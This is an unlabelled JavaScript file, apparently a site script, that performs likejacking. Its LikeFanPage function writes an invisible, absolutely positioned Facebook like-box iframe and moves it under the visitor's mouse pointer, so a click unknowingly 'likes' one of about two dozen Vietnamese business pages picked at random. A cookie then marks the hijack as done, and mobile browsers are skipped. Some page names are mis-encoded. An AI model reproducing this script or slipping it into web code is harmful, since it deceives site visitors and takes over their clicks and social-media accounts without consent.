function Set_Cookie(name,value,expires,path,domain,secure)
{var today=new Date();today.setTime(today.getTime());if(expires)
{expires=expires*1000*60*60*12;}
var expires_date=new Date(today.getTime()+(expires));document.cookie=name+"="+escape(value)+((expires)?";expires="+expires_date.toGMTString():"")+((path)?";path="+path:"")+((domain)?";domain="+domain:"")+((secure)?";secure":"");}
function Get_Cookie(name)
{var start=document.cookie.indexOf(name+"=");var len=start+name.length+1;if((!start)&&(name!=document.cookie.substring(0,name.length)))
{return null;}
if(start==-1)return null;var end=document.cookie.indexOf(";",len);if(end==-1)end=document.cookie.length;return unescape(document.cookie.substring(len,end));}
function Delete_Cookie(name,path,domain)
{if(Get_Cookie(name))document.cookie=name+"="+((path)?";path="+path:"")+((domain)?";domain="+domain:"")+";expires=Thu, 01-Jan-1970 00:00:01 GMT";}
function LikeFanPage(fanpage)
{var str='<div style="overflow: hidden !important; width: 56px; height: 30px; position: absolute;filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;z-index:10000 !important" id="icontainer">';str+='<iframe id="iffacebook" src="//www.facebook.com/plugins/likebox.php?href=https://www.facebook.com/'+fanpage+'&amp;width=600&amp;height=80&amp;colorscheme=light&amp;show_faces=false&amp;header=false&amp;stream=false&amp;show_border=false" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:600px !important; height:80px !important;margin-top:-30px;margin-left:-64px" allowTransparency="true"></iframe>';str+='</div>';document.write(str);jQuery(document).mousemove(function(e){if(!Get_Cookie(fanpage))
{jQuery('#icontainer').css({'top':(e.pageY-14)+'px','left':(e.pageX-30)+'px'});if(jQuery(document.activeElement).attr('id')=="iffacebook")
{Set_Cookie(fanpage,'Facebook',100000,'/','','');jQuery('#icontainer').css({'top':'0px','left':'0px'});}}});}
(function(a){jQuery.browser.mobile=/android.+mobile|avantgo|bada\/|iphone|ipad|ipod|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|e\-|e\/|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(di|rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|xda(\-|2|g)|yas\-|your|zeto|zte\-/i.test(a.substr(0,25))})(navigator.userAgent||navigator.vendor||window.opera);if(!jQuery.browser.mobile)
{var fans=new Array();fans[0] = "congtylapdatcameraquansat";fans[1] = "congtylapdatcameraquansat";fans[2] = "lapdatcameragiamsattaitphcm";fans[3] = "congtylapdatcameraquansat";fans[4] = "congtylapdatcameraquansat";fans[5] = "congtylapdatcameraquansat";fans[6] = "skickfit";fans[7] = "BÃºn-Thá»‹t-NÆ°á»›ng-HoÃ ng-VÄƒn-614002852021453";fans[8] = "Mua-bÃ¡n-sá»‰-láº»-Laptop-Computer-Linh-phá»¥-kiá»‡n-Ä‘iá»‡n-thoáº¡i-863395557023411";fans[9] = "ChÄƒn-Ga-Gá»‘i-Ä‘á»‡m-BQ-1391239387862719";fans[10] = "Venuco-Minnie-726590997477973";fans[11] = "shopthientam";fans[12] = "xhaivl";fans[13] = "phukienthanhdo.vn";fans[14] = "Mỹ-Phẩm-837661359711116";fans[15] = "xhaivl";fans[16] = "hoinhungnguoicuongpandorahaiye";fans[17] = "webyaho";fans[18] = "vinhomeslieugiai.co";fans[19] = "NhaKhoaTheHeMoi";fans[20] = "Số-1-Việt-Nam-1579142755746152";fans[21] = "SieuMayTinh";fans[22] = "kenhgamevn";fans[23] = "xe24h";fans[24] = "congtycpdvdatxanhmienbac";LikeFanPage(fans[Math.round(Math.random()*24)]);}